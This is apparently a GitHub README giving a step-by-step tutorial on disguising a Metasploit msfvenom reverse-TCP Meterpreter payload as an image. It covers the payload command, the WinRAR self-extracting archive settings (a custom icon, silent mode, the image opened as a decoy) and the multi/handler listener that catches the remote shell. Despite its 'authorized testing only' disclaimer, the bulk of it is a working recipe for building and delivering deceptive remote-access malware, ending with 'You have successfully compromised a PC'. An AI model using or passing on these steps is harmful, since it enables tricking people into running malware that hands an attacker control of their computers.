# 🚀 Binding an msfvenom Payload with an Image for Penetration Testing  
**⚠️ For authorized penetration testing purposes only! Unauthorized use is illegal and unethical.**

---

## 🛠️ Prerequisites

- **Operating Systems**:  
  - 🐧 **Kali Linux**: For payload generation and listener setup.  
  - 🖥️ **Windows OS**: For testing the payload delivery.  

- **Tools**:  
  - `msfvenom`: To generate the payload.  
  - `msfconsole`: To capture the reverse shell.  
  - **WinRAR**: To bind files into a single executable.  
  - **Image Editor** (e.g., GIMP, online converter): For creating `.ico` files.  

- **Required Files**:  
  - 🧩 `payload.exe`: The malicious file created with msfvenom.  
  - 🖼️ `icon.ico`: A custom icon to disguise the final file.  
  - 📸 `original_image.jpg`: The image that appears legitimate.

---

## ✍️ Steps to Bind msfvenom Payload with an Image  

### Step 0: 🛡️ Note: This payload only works on machine with security features *OFF* (firewall, Window real time protection, virus and threat protection etc. ) 

### Step 1: 🌐 Find Your IP Address and Choose a Port  
1. Open Kali Linux and find your IP address:  
   ```bash
   ip a
   ```  
   Locate the IP under the active network interface (e.g., `eth0` or `wlan0`).
   ![How to find IP address](https://github.com/user-attachments/assets/47e35044-d144-4555-bb6d-385b38387c41)


   **Why**:  
   The payload needs your IP to send the connection back.  

   **If not done**:  
   The payload cannot connect to your system.  

3. Choose a port:  
   Pick a port not already in use, like `4444` or `8080`. In my case I will use 192.168.163.74 as IP and 4444 as PORT

   **Why**:  
   Both the payload and listener must use the same port for communication.  

   **If not done**:  
   Connections won’t work if the port mismatches.

---

### Step 2: 🖼️ Create an `.ico` Icon File  

#### 1. **Convert to `.ico`**  
   - Using an **Online Converter**:✅ RECOMENDED
     - Upload the image to a service like [freeconvert.com](https://www.freeconvert.com/ico-converter).  
     - Download the `.ico` file.

   - Using **GIMP**:  
     - Open the image.  
     - Resize to 256x256.  
     - Go to `File > Export As` and save as `icon.ico`.  
     


   **Why**:  
   This step ensures the final executable looks like a harmless file.  

   **If not done**:  
   The file may display a generic app icon, raising suspicion.

---

### Step 3: 🛠️ Create the msfvenom Payload  

1. Run the following in Kali Linux:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe -o payload.exe
   ```  
   change <YOUR_IP> and <YOUR_PORT>
   
   ![Screenshot 2024-11-20 135204](https://github.com/user-attachments/assets/4e61ff1f-b1f6-4dee-bb2c-ba7bff6d6b38)

  

   **Why**:  
   This creates the payload (`payload.exe`) to connect back to your listener.  

   **If not done**:  
   The attack will fail without a working payload.  

---

### Step 4: 📦 Bind the Payload with the Image Using WinRAR  

#### 1. **Prepare Files**  
   Move `payload.exe`, `original_image.jpg`, and `icon.ico` to your Windows machine.  

#### 2. **Configure WinRAR**  

- **Create an SFX Archive**:  
  - Select all the 3 files & Right-click the files → Select `Add to Archive`.
  - In the settings, check **Create SFX archive**.
  - ![Screenshot 2024-11-20 140511](https://github.com/user-attachments/assets/212f8121-87c9-487b-8419-64f821ee7df8)


- **Advanced Settings**:  
  - Navigate to the **Advanced tab** → Click **SFX Options**.  
  - ![Screenshot 2024-11-20 141016](https://github.com/user-attachments/assets/d34cf986-89d3-44b4-b80c-e256cbc22c30)

#### SFX Options:  
1. **Setup Tab**  
   - Enter the following under "Run after extraction":  
     ```bash
     image.jpg
     payload.exe
     ```
   - ![Screenshot 2024-11-20 140947](https://github.com/user-attachments/assets/23908794-15ce-43db-8bac-c0505693831a)


   **Why**:  
   Ensures the image opens first while the payload executes in the background.  

   **If not done**:  
   Only the payload runs, which may look suspicious.  

2. **Text and Icon Tab**  
   - Select `icon.ico` under **Load SFX icon from the file**.
   - ![Screenshot 2024-11-20 140940](https://github.com/user-attachments/assets/9a1dd537-9929-435b-8746-74acda7ebd01)


   **Why**:  
   Gives the file a legitimate appearance.  

   **If not done**:  
   The file may look suspicious with a default icon.  

3. **Modes Tab**  
   - Select:  
     - **Unpack to temporary folder**  
     - **Silent mode: Hide all**
   - ![Screenshot 2024-11-20 140952](https://github.com/user-attachments/assets/298d724e-8067-47fc-a27d-535bdc466a66)


   **Why**:  
   Prevents showing extraction or activity windows.  

   **If not done**:  
   The user may notice unexpected behavior.  

---

### Step 5: 🛡️ Set Up the Listener in Metasploit  

1. Open Metasploit on Kali Linux:  
   ```bash
   msfconsole
   ```  

2. Configure the listener:  
   ```bash
   use exploit/multi/handler  
   set payload windows/meterpreter/reverse_tcp  
   set LHOST <YOUR_IP>  
   set LPORT <YOUR_PORT>  
   exploit  
   ```
   ![Screenshot 2024-11-20 143017](https://github.com/user-attachments/assets/9f3995b8-71f2-4400-941e-909bf849191f)

   **Why**:  
   This captures the reverse shell connection from the payload.  

   **If not done**:  
   Even if the target runs the file, you won’t receive any connection.  

---

### Step 6: 🧪 Test the Payload  

1. Transfer the final file (e.g., `vulnImage.jpg`) to the Windows machine. 
![Screenshot 2024-11-20 143156](https://github.com/user-attachments/assets/e4f86713-d0f6-4063-89c2-74fac25df087)
2. Open the file: 

   - The image displays, ensuring legitimacy.  
   - In the background, the payload runs and connects back to your listener. 

🎉 Congratulation: You have successfully compromised a PC
![Screenshot 2024-11-20 144427](https://github.com/user-attachments/assets/edade0da-4a2d-4fec-a48d-69bc816866ff)


   **Why**:  
   Verifies that the binding and payload work as expected.  

   **If not done**:  
   You won’t know if the attack was successful.  

---

## ⚠️ Legal Disclaimer  

This guide is for **educational purposes only**. Use it responsibly and only with explicit authorization. Unauthorized use is illegal and unethical.  

---

If you have any issues, you can create a issue at ISSUE section.